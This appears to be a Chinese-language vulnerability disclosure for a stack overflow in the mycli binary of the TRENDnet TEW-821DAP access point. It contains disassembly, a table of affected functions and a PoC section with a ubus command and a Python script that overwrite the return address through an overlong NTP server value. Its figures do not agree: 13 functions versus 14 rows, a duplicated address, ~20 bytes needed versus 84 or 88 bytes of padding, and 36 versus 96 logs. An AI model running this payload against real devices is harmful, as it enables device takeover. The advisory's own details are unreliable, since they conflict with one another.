# CVE-XXXX-XXXX3: TEW-821DAP mycli Time/Syslog UCI Stack Overflow

| 字段 | 值 |
|------|-----|
| 厂商 | TRENDnet |
| 产品 | TEW-821DAP AC1200 Dual Band PoE Access Point |
| 固件版本 | v2.2.01b05 |
| 受影响二进制 | `sbin/mycli` (363 KB, MIPS32 BE, 13个函数地址) |
| 漏洞类型 | CWE-121 Stack-based Buffer Overflow |
| CVSS 3.1 | **9.8 Critical** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| 关联CVE | CVE-2020-10214, CVE-2020-25506, CVE-2022-37798 (同类不同产品) |

---

## 1. 漏洞概述

mycli 在处理 NTP/时区/夏令时/系统日志/会话超时等 UCI 配置时，通过 `uci_get_option()` → `get_env()`(0x401140) → `strcpy()` 将外部可控的字符串复制到固定大小的栈缓冲区。**全部 13 个受影响的函数地址都使用相同的 unsafe get_env 封装函数，使用 strcpy 无界复制**。

---

## 2. FirmRec 符号执行证据

```
Simexp 验证: 36 条独立日志全部命中 "Return to 0x41414141"
关联CVE: CVE-2020-10214, CVE-2020-25506, CVE-2022-37798
Taint Applied: True (全部)
```

### 受影响函数清单

| 函数地址 | 栈帧 | $ra偏移 | 关键字 | 溢出所需 |
|---------|------|---------|--------|---------|
| 0x41D2BC | 168B | sp+164 | cameo.time.ntp_server | ~20B |
| 0x41AA2C | 168B | sp+164 | cameo.cameo.session_timeout | ~20B |
| 0x41B10C | 184B | sp+180 | cameo.cameo.syslog_server | ~20B |
| 0x41B1D0 | 448B | sp+444 | cameo.cameo.syslog_server | ~284B |
| 0x41B308 | 184B | sp+180 | cameo.cameo.syslog_server | ~20B |
| 0x41B3AC | 184B | sp+180 | cameo.cameo.syslog_server | ~20B |
| 0x41BEDC | 168B | sp+164 | cameo.time.time_daylight_offset | ~20B |
| 0x41C680 | 168B | sp+164 | cameo.time.time_daylight_saving_* | ~20B |
| 0x41D164 | 168B | sp+164 | cameo.time.ntp_client_enable | ~20B |
| 0x41D2BC | 168B | sp+164 | **cameo.time.ntp_server** | ~20B |
| 0x41D344 | 40B | sp+36 | time.nist.gov (hardcoded) | ~108B |
| 0x41D440 | 168B | sp+164 | cameo.time.time_zone_area | ~20B |
| 0x41E938 | 168B | sp+164 | cameo.time.ntp_sync_interval | ~20B |
| 0x41EA6C | 168B | sp+164 | cameo.time.system_time | ~20B |

### 反汇编验证（以 0x41D2BC 为例）

```
0x41D2BC: addiu $sp, $sp, -168   ; 帧 168B
0x41D2D4: sw    $ra, 164($sp)    ; $ra 在 sp+164
0x41D304: jal   0x401140          ; ★ get_env("cameo.time.ntp_server") — strcpy!
0x41D32C: lw    $ra, 164($sp)    ; ★ 恢复$ra — 仅需20B溢出
```

---

## 3. PoC

```bash
# 通过 ubus 设置超长 NTP 服务器地址
ubus call uci set '{"config":"cameo","section":"time","values":{"ntp_server":"'$(python3 -c "print('A'*88+'\x41\x41\x41\x41')")'"}}'
```

```python
# Python PoC
import subprocess, struct
PAYLOAD = b"A" * 84 + struct.pack(">I", 0x41414141)
cmd = ["ubus", "call", "uci", "set",
       '{"config":"cameo","section":"time","values":{"ntp_server":"'+PAYLOAD.decode("latin-1")+'"}}']
subprocess.run(cmd)
```

---

*证据: evidence/ 目录 96 条 simexp 日志*
*Simexp命中: 全部 Return to 0x41414141*
